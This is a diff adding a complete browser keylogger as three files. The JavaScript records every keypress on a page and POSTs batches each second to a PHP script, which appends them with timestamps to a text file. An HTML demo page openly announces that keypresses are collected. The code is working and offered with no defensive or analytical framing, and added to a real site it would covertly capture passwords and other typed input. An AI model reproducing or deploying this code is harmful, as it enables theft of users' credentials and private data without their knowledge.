@@ -1,0 +1,54 @@
+Keylog.php
+<?php
+$file = fopen('keylog.txt', 'a+');
+fwrite($file, date("Y-m-d H:i:s") . PHP_EOL . $_POST['presses'] . PHP_EOL);
+fclose($file);
+echo "OK";
+
+Keylog.js
+var keylog = {
+  // (A) SETTINGS & PROPERTIES
+  delay: 1000, // How often to send data to server
+  min: 5, // Send to server only when there are at least X presses
+  cache: [], // Key presses
+
+  // (B) LISTEN TO KEYPRESSES ON PAGE LOAD
+  init: function () {
+    window.addEventListener("keydown", function(evt){
+      keylog.cache.push(evt.key);
+    });
+    window.setInterval(keylog.send, keylog.delay);
+  },
+
+  // (C) SEND CAPTURED KEYS TO SERVER
+  send: function () { if (keylog.cache.length > keylog.min) {
+    // (C1) DATA
+    var data = new FormData;
+    data.append("presses", JSON.stringify(keylog.cache));
+
+    // (C2) AJAX
+    var xhr = new XMLHttpRequest();
+    xhr.open("POST", "keylog.php");
+    // OPTIONAL - FOR DEBUGGING OR FEEDBACK
+    // xhr.onload = function(){ console.log(this.response); };
+    xhr.send(data);
+    keylog.cache = [];
+  }}
+};
+window.addEventListener("DOMContentLoaded", keylog.init);
+
+Keylog.html
+<!DOCTYPE html> 
+<html> 
+<head> 
+<title>Simple JS Keylogger Example</title> 
+<script src="keylog.js"></script> 
+</head> 
+<body> 
+<h1>Keylogger Example</h1> 
+<p>All keypresses will be collected!</p> 
+<input type="text"/> 
+<br><br> 
+<textarea></textarea> 
+</body> 
+</html>
